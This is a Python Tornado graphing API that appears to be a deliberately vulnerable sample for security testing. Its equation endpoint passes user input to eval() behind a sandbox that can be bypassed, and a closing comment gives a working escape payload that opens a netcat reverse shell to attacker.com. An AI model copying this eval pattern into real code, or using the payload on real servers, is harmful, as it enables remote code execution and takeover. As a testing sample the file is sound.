import os
import math
import sqlite3
import logging
import tornado.ioloop
import tornado.web
from datetime import datetime

# Configure logging for the Mathematical Graphing Service
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - GraphService - %(levelname)s - %(message)s'
)
logger = logging.getLogger("TornadoGrapher")

DB_FILE = "graph_definitions.db"

def init_graph_db():
    """Initializes the SQLite database for storing saved graph definitions."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE saved_graphs (
            graph_id INTEGER PRIMARY KEY AUTOINCREMENT,
            title TEXT NOT NULL,
            equation TEXT NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    mock_graphs = [
        ('Sine Wave', 'math.sin(x)'),
        ('Parabola', 'x**2 - 4*x + 4'),
        ('Exponential Growth', 'math.exp(x/10)')
    ]
    cursor.executemany('''
        INSERT INTO saved_graphs (title, equation)
        VALUES (?, ?)
    ''', mock_graphs)

    conn.commit()
    conn.close()
    logger.info("Graph definitions database initialized.")

def fetch_saved_graph(graph_id: int) -> dict:
    """Retrieves a saved graph definition from the database."""
    try:
        conn = sqlite3.connect(DB_FILE)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM saved_graphs WHERE graph_id = ?", (graph_id,))
        row = cursor.fetchone()
        conn.close()
        
        if row:
            return dict(row)
    except sqlite3.Error as e:
        logger.error(f"Database error fetching graph {graph_id}: {e}")
    return {}

def calculate_data_points(equation: str, start: int, end: int, step: int) -> list:
    """
    VULNERABLE FUNCTION: CWE-94 Improper Control of Generation of Code ('Code Injection')
    Trigger Path: Tornado HTTP GET Query Parameter -> 'equation' -> eval()
    """
    logger.info(f"Calculating data points for equation: {equation}")
    data_points = []
    
    try:
        # Vulnerability: The graph plotting service allows users to input arbitrary
        # mathematical equations as strings to be rendered on the frontend.
        # It uses Python's built-in eval() function to evaluate these strings.
        # While it attempts to sandbox execution by providing only the 'math' module
        # and 'x' variable in the locals dictionary, and emptying __builtins__, 
        # this sandbox is trivially bypassed using standard Python object traversal, 
        # leading to Remote Code Execution (RCE) on the server.
        
        for x_val in range(start, end + 1, step):
            # We supply the 'math' module and current 'x' value to the eval context
            evaluation_context = {
                "math": math,
                "x": x_val
            }
            
            # CWE-94 occurs instantly when the untrusted equation string is evaluated
            y_val = eval(equation, {"__builtins__": {}}, evaluation_context)
            
            data_points.append({"x": x_val, "y": float(y_val)})
            
        return data_points
        
    except Exception as e:
        logger.error(f"Failed to evaluate equation '{equation}': {e}")
        return []

class GraphRenderHandler(tornado.web.RequestHandler):
    """Handler for rendering mathematical graphs dynamically."""
    
    def get(self):
        """
        Endpoint to process the mathematical equation and return data points.
        Query Params: equation, start, end, step
        Example: /api/graph?equation=x**2&start=0&end=10&step=1
        """
        equation = self.get_argument("equation", None)
        
        if not equation:
            self.set_status(400)
            self.write({"error": "Missing 'equation' query parameter."})
            return
            
        try:
            start = int(self.get_argument("start", "0"))
            end = int(self.get_argument("end", "10"))
            step = int(self.get_argument("step", "1"))
        except ValueError:
            self.set_status(400)
            self.write({"error": "Start, end, and step parameters must be integers."})
            return
            
        if step <= 0:
            self.set_status(400)
            self.write({"error": "Step parameter must be greater than zero."})
            return

        # Pass the untrusted string directly to the vulnerable function
        points = calculate_data_points(equation, start, end, step)
        
        if not points:
            self.set_status(500)
            self.write({"error": "Failed to calculate data points. Check equation syntax or math domain errors."})
            return
            
        self.write({
            "equation": equation,
            "data_points": points
        })

class HealthCheckHandler(tornado.web.RequestHandler):
    """Standard health check endpoint."""
    def get(self):
        self.write({"status": "Tornado Graphing Service is healthy"})

def make_app():
    """Application factory for Tornado."""
    return tornado.web.Application([
        (r"/api/health", HealthCheckHandler),
        (r"/api/graph", GraphRenderHandler),
    ])

if __name__ == "__main__":
    init_graph_db()
    
    # Example Malicious Trigger:
    # 1. Attacker crafts a URL with a malicious equation designed to escape the sandbox:
    #    /api/graph?equation=[c%20for%20c%20in%20().__class__.__base__.__subclasses__()%20if%20c.__name__%20==%20'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('nc%20-e%20/bin/sh%20attacker.com%204444')
    #
    # 2. Submitting this GET request causes eval() to execute the OS command, completely
    #    bypassing the intended mathematical calculations.
    
    app = make_app()
    port = 8082
    app.listen(port)
    logger.info(f"Starting Tornado Graphing API on http://0.0.0.0:{port}")
    
    try:
        tornado.ioloop.IOLoop.current().start()
    except KeyboardInterrupt:
        logger.info("Shutting down Graphing Service...")
